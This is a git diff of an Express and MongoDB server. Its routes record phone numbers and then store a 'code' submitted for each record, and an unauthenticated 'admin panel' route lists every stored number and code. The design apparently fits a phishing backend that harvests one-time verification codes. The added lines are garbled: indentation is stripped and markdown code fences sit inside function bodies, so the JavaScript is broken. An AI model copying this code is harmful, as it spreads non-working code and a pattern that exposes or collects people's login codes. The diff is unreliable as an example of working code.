@@ -8,98 +8,147 @@ app.use(cors());
 app.use(express.json());
 
 mongoose
-  .connect(process.env.MONGO_URL)
-  .then(() => console.log("MongoDB Connected"))
-  .catch((err) => console.log(err));
+.connect(process.env.MONGO_URL)
+.then(() => console.log("MongoDB Connected"))
+.catch((err) => console.log(err));
 
 const UserSchema = new mongoose.Schema({
-  phone: String,
-  code: String,
-  createdAt: {
-    type: Date,
-    default: Date.now,
-  },
+phone: String,
+code: String,
+createdAt: {
+type: Date,
+default: Date.now,
+},
 });
 
 const User = mongoose.model("User", UserSchema);
 
 // ثبت شماره
 app.post("/phone", async (req, res) => {
-  try {
-    const { phone } = req.body;
+try {
+const { phone } = req.body;
 
-    if (!phone) {
-      return res.status(400).json({
-        error: "phone required",
-      });
-    }
+```
+if (!phone) {
+  return res.status(400).json({
+    error: "phone required",
+  });
+}
 
-    const user = await User.create({
-      phone,
-      code: "",
-    });
-
-    res.json({
-      id: user._id,
-      success: true,
-    });
-  } catch (err) {
-    res.status(500).json({
-      error: err.message,
-    });
-  }
+const user = await User.create({
+  phone,
+  code: "",
 });
 
-// ذخیره کد
+res.json({
+  id: user._id,
+  success: true,
+});
+```
+
+} catch (err) {
+res.status(500).json({
+error: err.message,
+});
+}
+});
+
+// ذخیره کد (مسیر جدید)
+app.post("/verify", async (req, res) => {
+try {
+const { id, code } = req.body;
+
+```
+if (!id || !code) {
+  return res.status(400).json({
+    ok: false,
+    error: "id and code required",
+  });
+}
+
+const user = await User.findByIdAndUpdate(
+  id,
+  { code },
+  { new: true }
+);
+
+if (!user) {
+  return res.status(404).json({
+    ok: false,
+    error: "user not found",
+  });
+}
+
+res.json({
+  ok: true,
+  user,
+});
+```
+
+} catch (err) {
+res.status(500).json({
+ok: false,
+error: err.message,
+});
+}
+});
+
+// مسیر قدیمی هم باقی بماند
 app.put("/code/:id", async (req, res) => {
-  try {
-    const { id } = req.params;
-    const { code } = req.body;
+try {
+const { id } = req.params;
+const { code } = req.body;
 
-    const user = await User.findByIdAndUpdate(
-      id,
-      { code },
-      { new: true }
-    );
+```
+const user = await User.findByIdAndUpdate(
+  id,
+  { code },
+  { new: true }
+);
 
-    if (!user) {
-      return res.status(404).json({
-        error: "user not found",
-      });
-    }
+if (!user) {
+  return res.status(404).json({
+    error: "user not found",
+  });
+}
 
-    res.json({
-      success: true,
-      user,
-    });
-  } catch (err) {
-    res.status(500).json({
-      error: err.message,
-    });
-  }
+res.json({
+  success: true,
+  user,
+});
+```
+
+} catch (err) {
+res.status(500).json({
+error: err.message,
+});
+}
 });
 
 // پنل ادمین
 app.get("/users", async (req, res) => {
-  try {
-    const users = await User.find().sort({
-      createdAt: -1,
-    });
+try {
+const users = await User.find().sort({
+createdAt: -1,
+});
 
-    res.json(users);
-  } catch (err) {
-    res.status(500).json({
-      error: err.message,
-    });
-  }
+```
+res.json(users);
+```
+
+} catch (err) {
+res.status(500).json({
+error: err.message,
+});
+}
 });
 
 app.get("/", (req, res) => {
-  res.send("API running");
+res.send("API running");
 });
 
 const PORT = process.env.PORT || 3000;
 
 app.listen(PORT, () => {
-  console.log("Server running on", PORT);
+console.log("Server running on", PORT);
 });
